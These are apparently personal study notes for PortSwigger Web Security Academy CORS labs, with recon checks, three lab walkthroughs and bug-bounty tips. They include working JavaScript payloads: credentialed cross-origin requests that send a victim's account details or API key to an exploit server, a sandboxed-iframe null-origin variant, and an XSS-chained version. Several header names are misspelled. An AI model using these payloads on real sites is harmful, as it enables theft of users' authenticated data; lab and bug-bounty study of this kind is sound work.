## Recon

- Find all requests with `Access-Control-Allow-Credentials: true` that return sensitive data.
- Test if `Origin: https://evil.com' returns `Access-Control-Allow-Origin: https://evil.com`  --> CORS vulnerability with basic origin reflection
- Test if `Origin: null` returns `Access-Controle-Allow-Origin: null` --> CORS vulnerability with trusted null origin
- Test if `Origin: https://test.LAB-ID.web-security-academy.net ` returns `Access-Control-Allow-Origin: http://stock.LAB-ID.web-security-academy.net` --> CORS vulnerability with trusted insecure protocols


## [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

- Look for a request that returns PII like an API key
- Change the Origin header to evil.com and look for the following headers in the response:

```html
Access-Controle-Allow-Origin: https://evil.com
Access-Controle-Allow-Credentials: true
```

- Get the victim to click a link to a page with this script:

```html
<html>
    <body>
        <script>
            // 1. Initialize a new asynchronous HTTP request
            var xhr = new XMLHttpRequest();
  
            // 2. The target URL where the sensitive data (like API keys or profile info) lives
            var url = "https://0a4300b503a189488001f88600b0009b.web-security-academy.net"

            // 3. Define what happens when the request state changes
            xhr.onreadystatechange = function() {
                // Check if the request is fully complete (DONE)
                if (xhr.readyState == XMLHttpRequest.DONE){
                    /* 4. EXFILTRATION:
                       Once the data is received, send it to the attacker's server.
                       It appends the sensitive response text as a query parameter 
                       to the /log endpoint on the exploit server.
                    */
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            // 5. Configure the request: GET method to the sensitive /accountDetails endpoint
            xhr.open('GET', url + "/accountDetails", true); 
  
            /* 6. THE KEY TO THE EXPLOIT:
               Setting withCredentials to 'true' tells the browser to include the victim's 
               session cookies in this cross-origin request. If the target server has a 
               weak CORS policy (Access-Control-Allow-Credentials: true), it will 
               process the request as the logged-in user.
            */
            xhr.withCredentials = true;
  
            // 7. Fire the request
            xhr.send(null)
        </script>
    </body>
</html>

```

## [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

- Look for a request that returns PII like an API key
- Change the Origin header to evil.com and look for the following headers in the response:

```html
Access-Controle-Allow-Origin: null
Access-Controle-Allow-Credentials: true
```

- You'll need to use an iframe sandbox for CORS attacks against servers with null origin allowed.

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://<lab>.web-security-academy.net/accountDetails', {
      method: 'GET',
      credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
      const apiKey = data.apikey;
      fetch('https://exploit-<exploit>.exploit-server.net/log?apiKey=' + apiKey);
    });
  </script>
"></iframe>
```

```html
<html>
	<body>
		<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
		<script>
			var xhr = new XMLHttpRequest();
			var url = 'https://target.com'
	
			xhr.onreadystatechange = function() {
				if (xhr.readyState == XMLHttpRequest.DONE) {
					fetch('/log?key=' + xhr.responseText)
				}
			}
	
			xhr.open('GET', url + '/sesitiveShit', true);
			xhr.withCredentials = true;
			xhr.send(null)
		</script>"></iframe>
	</body>
</html>
```

## [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

- Look for a request that returns PII like an API key
- Change the origin header to one that ends with the origin of the site (a subdomain of the site)
- Look for the modified origin header reflected in the Access-Control-Allow-Origin header.
- Find a XSS vulnerability in one of the sites subdomains.

```html
<script> document.location="http://stock.LAB-ID.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://LAB-ID.web-security-academy.net';xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-ID.exploit-server.net?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/accountDetails', true); xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1" </script>


```

#### Notes for Bug Bounty

- When testing for CORS look through request and response jsonl file for `Access-Controle-Allow-Credentials: true`
- This will narrow down that targets you should test for CORS because the original request will have the  `Access-Controle-Allow-Credentials: true`  header if personal information is even able to be retrieved. If  `Access-Controle-Allow-Credentials:` is set to false theres no reason to test for CORS because sensitive data is not being sent over http.
